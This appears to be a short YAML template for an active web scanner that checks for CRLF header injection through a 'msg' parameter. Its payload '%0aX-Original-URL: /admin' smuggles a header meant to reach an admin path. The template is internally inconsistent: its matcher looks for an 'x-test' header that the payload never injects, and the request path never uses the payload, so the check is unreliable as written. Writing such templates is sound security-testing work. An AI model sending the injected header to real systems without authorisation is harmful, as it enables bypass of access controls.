id: crlf3-065
name: 'CRLF into msg'
severity: medium
type: active
tags:
  - crlf
  - injection
  - headers
description: 'CRLF header injection via msg'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      msg:
        - '%0aX-Original-URL: /admin'
    matchers:
      - type: word
        part: headers
        words:
          - 'x-test'
